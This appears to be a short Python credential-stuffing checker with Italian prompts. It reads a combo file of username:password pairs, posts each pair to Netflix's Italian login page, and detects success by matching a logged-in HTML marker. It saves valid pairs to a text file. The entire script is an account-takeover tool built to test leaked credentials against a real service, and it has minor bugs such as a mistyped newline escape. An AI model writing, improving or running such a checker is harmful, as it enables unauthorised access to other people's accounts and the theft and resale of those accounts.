import requests



def failed(userLoginId, passowrd):

    print(f"Failed: {userLoginId}:{passowrd}")



def passed(userLoginId, password):

    print(f"Success: {userLoginId}:{password}")

    print(f"{userLoginId}:{password}", file=open("Test.txt", "w"))



def checker(data):

    userLoginId = data[0]

    password = data[1]

    success_keyword = """<a class="current active" href="/browse">Home</a>"""

    api_sender = requests.session()

    source = api_sender.post("https://www.netflix.com/it/login", data={"userLoginId": userLoginId,
                                                                       "password": password}).text

    print(source, file=open("Source.txt", "w"))

    if success_keyword in source:

        passed(userLoginId, password)

    else:

        failed(userLoginId, password)



nome_combo = input("Inserire il nome del file: ")

combo = open(nome_combo, "r").readlines()

arrange = [lines.replace("/n", "")for lines in combo]

for lines in arrange:

    data = lines.split(":")

    checker(data)
